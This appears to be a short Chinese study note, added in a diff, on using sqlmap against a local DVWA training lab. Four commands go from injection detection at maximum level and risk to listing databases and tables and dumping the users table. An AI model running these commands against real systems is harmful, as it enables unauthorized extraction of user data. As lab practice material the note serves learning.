@@ -1,0 +1,10 @@
+利用sqlmap自动化检测和拿到数据库信息
+
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=8df7a22074652a6c1ff8401771e2e034; security=low" --level=5 --risk=3 --batch -o        --batch(自动选择默认选项，不用手动交互)  -o:简化输出  risk3:最高风险测试 level5:最大测试范围
+
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=8df7a22074652a6c1ff8401771e2e034; security=low" --level=5 --risk=3 --batch -o --dbs         
+
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=8df7a22074652a6c1ff8401771e2e034; security=low" --level=5 --risk=3 --batch -o -D dvwa --tables
+
+sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=8df7a22074652a6c1ff8401771e2e034; security=low" --level=5 --risk=3 --batch -o -D dvwa -T users --dump           -D:database   -T:table   --dump:显示指定的全部数据
+
